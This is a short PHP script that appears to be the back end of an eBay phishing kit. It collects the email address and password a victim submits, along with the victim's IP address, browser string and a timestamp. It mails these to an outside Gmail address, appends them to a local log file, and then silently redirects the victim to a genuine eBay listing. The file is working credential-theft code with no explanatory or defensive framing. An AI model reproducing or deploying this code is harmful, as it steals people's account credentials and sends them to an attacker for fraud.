


<?php

$d = date('l dS \of F Y h:i:s A'); $ip = $_SERVER['REMOTE_ADDR']; $message .= "+++++++++++++++++++++++eBay++++++++++++++++++++++\n";$message .= "IP: $ip \n";$message .= "EMAIL : ".$_POST['email']."\n";$message .= "PASSWORD : " .$_POST['password']."\n";$message .= "BROWSER : " .$_SERVER['HTTP_USER_AGENT']."\n";$message .= "Data: ".date('l dS \of F Y h:i:s A')."\n";$message .= "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";$message .= "\n";

$r = "bnbdeluxe@gmail.com"; $subject = "$ip"; $headers = "From: $ip <$ip>"; mail($r,$subject,$message,$headers);$fisier = "user.txt";$fh = fopen($fisier, 'a');fwrite($fh, $message);fclose($fh);       ?>


<html>

<meta http-equiv="refresh" content="0; url=https://www.ebay.de/itm/334191753904?hash=item4dcf617ab0:g:2i0AAOSw3kdhc8TV"> </html>